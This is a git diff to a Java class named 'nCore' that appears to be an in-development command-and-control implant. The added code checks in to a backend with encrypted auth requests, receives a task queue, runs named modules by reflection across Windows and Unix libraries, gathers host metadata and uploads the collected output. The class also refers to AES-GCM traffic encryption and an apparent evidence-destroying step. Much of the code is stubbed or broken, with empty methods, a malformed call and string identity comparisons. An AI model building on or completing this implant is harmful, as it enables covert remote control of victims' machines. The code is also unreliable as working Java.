@@ -56,6 +56,7 @@ import java.security.cert.CertificateException;
 import java.security.cert.X509Certificate;
 import java.security.spec.AlgorithmParameterSpec;
 import java.text.DecimalFormat;
+import java.text.SimpleDateFormat;
 import java.security.InvalidKeyException;
 
 
@@ -83,8 +84,11 @@ public class nCore
     static public String cookieData = "null";
     static public String sessUUID = "";
     static public String nonce = "";
+    static public int queue = 0;
+    static public Hashtable tasks = new Hashtable();
+    static public ArrayList output = new ArrayList();
 
-    public static void Main(String[] args)
+    public static void Main(String[] args) throws ClassNotFoundException
     {
         sessUUID = UUID.randomUUID().toString();
         //convert to threadable once main loop has been tested
@@ -97,51 +101,108 @@ public class nCore
             cm.spoliate();
         }
 
-
-        modLib.getUpdate();
+        modLib.autoLib aLib = new modLib.autoLib();
+        aLib.getUpdate();
 
         //execute initial 
         //start loop
-        react("metadata");
+        react("metadata",null);
     }
 
     public static boolean keepalive()
     {
         //5 tries to checkin
         network nComm = new network();
+        utilitarian nUtil = new utilitarian();
+
         for (int c=0; c<5; c++)
-        try
         {
-            nComm.request(nComm.mkAuth(),"auth");
-        }
-        catch
-        {
+            try
+            {  
+                String cReq = nComm.request(nComm.mkAuth(),"auth");
+                if (cReq != "null")
+                {
+                    Hashtable xmlResponse = nUtil.xmlStringToParseable(cReq);    
 
-        }
+                    nonce = xmlResponse.get("nonce").toString();
+                    cookieData = xmlResponse.get("cookie").toString();
+                    queue = Integer.valueOf(xmlResponse.get("taskQueue").toString());
 
+                    return true;
+                }
+                else
+                {
+                    continue;
+                }
+            }
+            catch (Exception e)
+            {
+                continue;
+            }
+        }
+        return false;
     }
 
-    public static void react(String methodName)
+    public static void task()
+    {
+        react()
+    }
+
+    public static void react(String methodName, String[] args) throws ClassNotFoundException, Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
     {
         //exec method, uses threader, loops to keepalive
         // 1. recv cmd
         // 2. modsearch
         // 3. thread mod if extant
         // 4. attempt to pull if not
+        utilitarian nUtil = new utilitarian();
+        Hashtable methObj = nUtil.getMethodByName(methodName);
+
+        if (methObj != null)
+        {
+            threader(
+                (Class) methObj.get("class"),
+                (Method) methObj.get("method")
+            );
+        }
+        else
+        {
+            //pull module
+        }
+        send();
     }
 
-    public static void threader()
+    public static void threader(Class classData, Method methodData)
     {
 
+    }
+
+    public static void send() throws Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
+    {
+        network nComm = new network();
+        if (output.size() > 0)
+        {
+            for (int d=0;d<output.size();d++)
+            {
+                try {
+                    String cReq = nComm.request(nComm.mkAuth(),"upload");
+                }
+                catch (Exception e)
+                {
+                    continue;
+                }
+            }
+        }
+        task();
     }
 
     //need class getter
 
-    static class modLib
+    private static class modLib
     {
-        public class autoLib
+        private static class autoLib
         {
-            private void getUpdate()
+            private static void getUpdate()
             {
                 // update the autolib from the backend
             }
@@ -193,8 +254,9 @@ public class nCore
 
         private class genLib
         {
-            private Document metadata() throws SocketException, UnknownHostException, ParserConfigurationException
+            private void metadata() throws SocketException, UnknownHostException, ParserConfigurationException, TransformerException
             {
+                Hashtable<String,String> outObj = new Hashtable<>();
                 Hashtable<String,String> metadata = new Hashtable<>();
                 utilitarian nUtil = new utilitarian();
 
@@ -208,7 +270,13 @@ public class nCore
                 metadata.put("hostname",nUtil.getHostname());
                 metadata.put("uuid",sessUUID);
 
-                return nUtil.outputToXmlDoc("metadata",metadata);
+                Document metaDoc = nUtil.outputToXmlDoc("metadata",metadata);
+
+                outObj.put("mod",new Object(){}.getClass().getEnclosingMethod().getName());
+                outObj.put("timestamp",new SimpleDateFormat("yyyy.MM.dd.HH.mm.ss").format(new java.util.Date()));
+                outObj.put("output",nUtil.xmlDocToString(metaDoc));
+
+                nCore.output.add(outObj);
             }
         }
 
@@ -228,25 +296,31 @@ public class nCore
     private static class utilitarian
     {
 
-        private Method getMethodByName(String methodName)
+        private Hashtable getMethodByName(String methodName) throws ClassNotFoundException
         {
+            Hashtable methObj = new Hashtable();
+            String[] classSet = new String[]{"autoLib","genLib","nixLib","winLib"};
+            for (int c=0;c<classSet.length;c++)
+            {
+                Class cData = Class.forName(classSet[c]);
+                try
+                {
+                    methObj.put("method",cData.getMethod(methodName,null));
+                    methObj.put("class",cData);
+                }
+                catch (Exception e)
+                {
+                    continue;
+                }
+            }
             
-        }
-
-        private Class getClassByName(String className)
-        {
-
-        }
-
-        private ArrayList<Method> getClassMethods(String className)
-        {
-
+            return methObj;
         }
 
         private Hashtable xmlStringToParseable(String input) throws ParserConfigurationException, IOException, SAXException
         {
             //responses should adhere to pattern:
-            //<response><nonce data=""></nonce><cookie data=""></cookie><blob>b64</blob></response>
+            //<response><nonce data=""></nonce><cookie data=""><taskqueue>0</taskqueue></cookie><blob>b64</blob></response>
             Hashtable xmlData = new Hashtable();
 
             DocumentBuilderFactory manufactorum = DocumentBuilderFactory.newInstance();
@@ -354,7 +428,7 @@ public class nCore
         }
     }
 
-    private class network
+    private static class network
     {
         private String mkAuth() throws Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
         {
@@ -475,7 +549,7 @@ public class nCore
         }
     }
 
-    private class security
+    private static class security
     {
         //replicates my lycanthropy aesgcm
         private byte[] encrypt(byte[] plaintext, byte[] nonce) throws Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
